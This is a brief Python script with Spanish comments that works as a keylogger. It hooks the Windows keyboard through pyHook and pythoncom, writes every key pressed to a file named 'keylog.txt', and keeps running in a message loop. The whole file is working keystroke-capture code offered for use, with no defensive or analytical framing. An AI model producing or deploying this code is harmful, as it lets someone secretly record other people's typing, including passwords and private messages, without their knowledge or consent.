import pyHook
import pythoncom
import logging

# Establecer el nombre del archivo de registro
file_log = "keylog.txt"  # Puedes cambiar el nombre del archivo aquí

# Configuración de logging
logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')

# Función que maneja el evento del teclado
def OnKeyboardEvent(event):
    # Registrando la tecla pulsada en el archivo de log
    logging.log(10, chr(event.Ascii))
    return True

# Crear y configurar el HookManager
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent

# Iniciar el hook del teclado
hooks_manager.HookKeyboard()

# Mantener el script en ejecución
pythoncom.PumpMessages()

